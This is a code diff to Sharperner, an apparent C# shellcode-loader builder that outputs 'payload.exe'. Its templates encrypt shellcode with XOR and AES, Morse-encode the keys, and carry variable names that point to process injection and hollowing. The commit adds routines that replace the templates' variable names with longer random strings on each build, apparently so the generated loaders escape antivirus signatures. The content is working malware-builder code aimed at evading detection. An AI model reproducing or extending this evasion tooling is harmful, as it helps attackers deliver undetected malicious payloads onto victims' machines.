@@ -104,7 +104,7 @@ namespace Sharperner
 
         public static string GenerateRandomString()
         {
-            int length = random.Next(5,10);
+            int length = random.Next(8,15);
             var rString = "";
             for (var i = 0; i < length; i++)
             {
@@ -462,6 +462,18 @@ Sharperner.exe /file:file.txt /out:payload.exe
 
                         }
 
+                        //randomize variable names
+                        string[] variableNames = { "xoredAesB64", "xorKey", "aE5k3y", "aE5Iv", "aesEncrypted", "sh3Llc0d3", "lpNumberOfBytesWritten", "processInfo",
+                                                    "pHandle", "rMemAddress", "tHandle", "ptr", "theKey", "mixed", "input", "theKeystring", "cipherText", "rawKey", "rawIV", "rijAlg", "decryptor", 
+                                                    "msDecrypt", "csDecrypt", "srDecrypt", "plaintext", "cipherData", "decryptedData", "ms", "cs", "alg", "MorseForFun","startInfo","procInfo", "binaryPath",
+                                                    "random", "aes_key", "aes_iv", "stringBuilder"};
+
+                        foreach (string variableName in variableNames)
+                        {
+                            templateFileContent = templateFileContent.Replace(variableName, GenerateRandomString());
+                        }
+
+
                         // replace in template file
                         templateFileContent = templateFileContent.Replace("REPLACE SHELLCODE HERE", xorAesEncStringB64).Replace("REPLACE XORKEY", xorKey).Replace("REPLACE A3S_KEY", morsed_aeskey).Replace("REPLACE A3S_IV", morsed_aesiv);
                     }
@@ -561,7 +573,18 @@ Sharperner.exe /file:file.txt /out:payload.exe
                     // replace required values
                     try
                     {
+                        //randomize variable names
+                        string[] variableNames = { "morsed", "sh3llc0de", "decoded", "b64a3skey", "b64a3siv", "morsedb64a3skey", "morsedb64a3siv", "morsedxorKey", "xorKey",
+                                                    "x0rek3y", "ciphertext", "recovered", "policy", "explorer_handle", "hollow_bin", "pid", "bytesWritten", "p_size", "overwrite",
+                                                    "translated", "lines", "delim", "ascii_to_morse"};
+
+                        foreach (string variableName in variableNames)
+                        {
+                            templateFileContent = templateFileContent.Replace(variableName, GenerateRandomString());
+                        }
+
                         templateFileContent = templateFileContent.Replace("REPLACE SHELLCODE HERE", xorAesEncStringB64).Replace("REPLACE XORKEY", xorKey).Replace("REPLACE A3S_KEY", morsed_aeskey).Replace("REPLACE A3S_IV", morsed_aesiv);
+
                     }
                     catch
                     {
